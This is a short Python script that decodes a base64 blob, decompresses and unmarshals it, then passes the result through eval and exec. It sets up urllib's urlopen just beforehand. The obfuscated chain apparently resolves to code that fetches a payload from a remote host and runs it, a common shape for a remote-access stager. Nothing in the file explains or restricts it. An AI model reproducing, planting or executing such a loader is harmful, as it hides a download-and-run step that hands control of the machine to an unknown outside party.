import sys,zlib,base64,marshal,json,urllib
if sys.version_info[0] > 2:
    from urllib import request
urlopen = urllib.request.urlopen if sys.version_info[0] > 2 else urllib.urlopen
exec(eval(marshal.loads(zlib.decompress(base64.b64decode(b'eJwrtWFgYCgtyskvSM3TUM8oKSmw0tc3NLbUs7TUMzI20zM0MrYyNDa20NcvLklMTy0q1k+1dNYrqFTX1CtKTUzR0AQATHsSGg==')))))